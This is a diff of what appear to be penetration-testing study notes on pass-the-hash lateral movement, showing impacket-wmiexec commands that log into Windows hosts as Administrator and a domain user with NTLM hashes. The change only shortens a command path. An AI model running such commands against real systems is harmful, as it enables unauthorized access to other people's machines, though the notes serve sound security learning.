@@ -3411,7 +3411,7 @@ This technique also requires the admin share called **ADMIN$** to be available a
 This method works for Active Directory **domain accounts** (need to be part of the **Administrators local group**) and the built-in local **administrator** account. However, due to the 2014 security update, this technique can not be used to authenticate as any other local admin account.
 
 ```bash
-/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
 
 impacket-wmiexec -hashes :369def79d8372408bf6e93364cc93075 corp/jen@192.168.146.73
 ```
